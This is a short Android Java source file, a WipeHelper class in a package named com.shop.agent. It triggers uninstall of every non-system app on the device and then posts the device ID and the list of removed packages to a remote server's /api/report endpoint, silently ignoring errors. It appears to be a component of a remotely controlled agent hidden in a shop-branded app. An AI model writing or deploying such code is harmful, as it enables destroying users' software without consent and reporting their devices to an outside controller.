package com.shop.agent;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;

import org.json.JSONObject;

import java.util.List;

public class WipeHelper {

    public static void removeAllUserApps(Context ctx, String deviceId, String base) {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps =
                pm.getInstalledApplications(PackageManager.GET_META_DATA);
            StringBuilder sb = new StringBuilder();
            for (ApplicationInfo ai : apps) {
                boolean isSystem =
                    (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                if (isSystem) continue;
                sb.append(ai.packageName).append('\n');
                Intent i = new Intent(Intent.ACTION_DELETE,
                    Uri.parse("package:" + ai.packageName));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                try { ctx.startActivity(i); } catch (Exception ignored) {}
            }
            JSONObject o = new JSONObject();
            o.put("id", deviceId);
            o.put("kind", "wipe");
            o.put("body", sb.toString());
            Net.post(base + "/api/report", o.toString());
        } catch (Exception ignored) {}
    }
}
